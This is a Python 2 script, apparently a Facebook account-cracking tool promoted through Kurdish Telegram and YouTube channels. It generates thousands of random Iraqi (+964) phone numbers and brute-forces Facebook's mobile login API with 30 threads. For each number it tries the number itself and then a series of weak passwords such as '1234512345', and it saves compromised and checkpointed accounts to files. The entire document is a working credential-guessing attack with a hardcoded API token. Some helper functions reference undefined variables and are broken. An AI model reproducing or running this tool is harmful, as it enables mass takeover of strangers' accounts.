

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('No Module Named Requests! type:pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('No Module Named Mechanize! type:pip2 install mechanize')
    time.sleep(1)
    os.system('Then type: python2 BSS.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
    print 'Thanks.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')

def menu():
    os.system('clear')
    time.sleep(2)
    print '\x1b[32m.'
    os.system('clear')
    os.system('figlet PY')
logo = """\033[91m
____ ____ ____
| __ ) ___/ ___|
|  _ \___ \___ \
                 
|____/____/____/
\033[93mTELEGRAM CHANEL = KURDISH IT
YOUTUBE CHANEL = MIRAN BOSS
TELEGRAM SHXSE = Dragon_Crack4  
TELEGRAM ADMIN = king_it2
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="""

def menu():
    os.system('clear')
    print logo
    print '\x1b[1;92m[1]\x1b[1;92m  Iraq'
    print '\x1b[1;95m[2]\x1b[1;92m  Arbil'
    print '\x1b[1;93m[3]\x1b[1;92m  slemani'
    print '\n\x1b[1;91m[0]  Exit            '
    print '\x1b[1;92m--------------------------------------------------\n'
    action()


def action():
    global cpb
    global oks
    peak = raw_input('\n\x1b[1;92mChoose an Option : \x1b[1;91m')
    if peak == '':
        print '[!] Fill In Correctly'
        action()
    elif peak == '1':
        os.system('clear')
        print logo
        print '\x1b[1;91m IRAQ ' + '\n'
        print '\x1b[1;92m770-771-772-773-774-750-751-752-753-754' + '\n'
        try:
            c = raw_input('\x1b[1;91mChoose Code : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '2':
        os.system('clear')
        print logo
        print '\x1b[1;91m ARBIL ' + '\n'
        print '\x1b[1;92m770-771-772-773-774-750-751-752-753-754-780-781-782-783-784' + '\n'
        try:
            c = raw_input('\x1b[1;91mChoose Code : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
     
    elif peak == '3':
        os.system('clear')
        print logo
        print '\x1b[1;92m  Slemani '+ '\n'
        print '\x1b[1;92m770-771-772-773-774-750-751-752-753-754-780-781-782-783-784' + '\n'
        try:
            c = raw_input('\x1b[1;91mChoose Code : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
           
    elif peak == '0':
        menu()
    else:
        print '[!] Fill In Correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] Hamu zhmarakan: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Hack krdn dastepekrd')
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Tkayachawarebka...')
    time.sleep(0.5)
    psb('[!] Bowastandne Toll  CTRL + z')
    time.sleep(0.5)
    print '\x1b[1;91m--------------------------------------------------'

    def main(arg):
        user = arg
        try:
            os.mkdir('IT')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACK BO]\x1b[1;92m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[HACK NABW]\x1b[1;91m ' + k + c + user + ' | ' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1234512345'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACK BO]\x1b[1;92m ' + k + c + user + '|' +pass2 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + pass2 + '\n')
                okb.close()
                oks.append(c + user + pass2)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[HACK NABW]\x1b[1;91m ' + k + c + user + ' >>> ' + pass2 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + pass2 + '\n')
                cps.close()
                cpb.append(c + user + pass2)
            else:
                    pass3 = '1234554321'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[HACK BO]  ' + k + c + user + '  \x1b[1;92m|  ' + pass3
                        okb = open('anggaxd/clone.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m[HACK NABW] \x1b[1;91m' + k + c + user + '  \x1b[1;91m|  ' + pass3
                        cps = open('anggaxd/clone.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = '1122334455'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[HACK BO]  ' + k + c + user + '  \x1b[1;92m|  ' + pass4
                            okb = open('anggaxd/clone.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m[HACK NABW] \x1b[1;91m' + k + c + user + '  \x1b[1;91m|  ' + pass4
                            cps = open('anggaxd/clone.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 ='123456123456'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[HACK BO]  ' + k + c + user + '  \x1b[1;92m|  ' + pass5
                                okb = open('anggaxd/clone.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;91m[HACK NABW] \x1b[1;91m' + k + c + user + '  \x1b[1;91m|  ' + pass5
                                cps = open('anggaxd/clone.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
                            else:
                                pass6 = '12344321'
                                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[HACK BO]  ' + k + c + user + '  \x1b[1;92m|  ' + pass6
                                    okb = open('anggaxd/clone.txt', 'a')
                                    okb.write(k + c + user + pass6 + '\n')
                                    okb.close()
                                    oks.append(c + user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;91m[HACK NABW] \x1b[1;91m' + k + c + user + '  \x1b[1;91m|  ' + pass6
                                    cps = open('anggaxd/clone.txt', 'a')
                                    cps.write(k + c + user + pass6 + '\n')
                                    cps.close()
                                    cpb.append(c + user + pass6)
                                else:
                                    pass7 ='987654321'
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[HACK BO]  ' + k + c + user + '  \x1b[1;92m|  ' + pass7
                                        okb = open('anggaxd/clone.txt', 'a')
                                        okb.write(k + c + user + pass7 + '\n')
                                        okb.close()
                                        oks.append(c + user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;91m[HACK NABW] \x1b[1;91m' + k + c + user + '  \x1b[1;91m|  ' + pass7
                                        cps = open('anggaxd/clone.txt', 'a')
                                        cps.write(k + c + user + pass7 + '\n')
                                        cps.close()
                                        cpb.append(c + user + pass7)
                                    else:
                                        pass8 = '11223344556677'
                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;92m[HACK BO]  ' + k + c + user + '  \x1b[1;92m|  ' + pass8
                                            okb = open('anggaxd/clone.txt', 'a')
                                            okb.write(k + c + user + pass8 + '\n')
                                            okb.close()
                                            oks.append(c + user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;91m[HACK NABW] \x1b[1;91m' + k + c + user + '  \x1b[1;91m|  ' + pass8
                                            cps = open('anggaxd/clone.txt', 'a')
                                            cps.write(k + c + user + pass8 + '\n')
                                            cps.close()
                                            cpb.append(c + user + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;93m='
    print '[\xe2\x9c\x93]\x1b[1;93m HACK KRDN KOTAYHAT ....'
    print '[\xe2\x9c\x93]\x1b[1;92m Total successfull/\x1b[1;96mcheckpoint : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] Cloned Accounts Has Been Saved : anggaxd/clone.txt'
    raw_input('\n\x1b[1;93m[\x1b[1;93mBack\x1b[1;93m]')
    menu()


if __name__ == '__main__':
    menu()
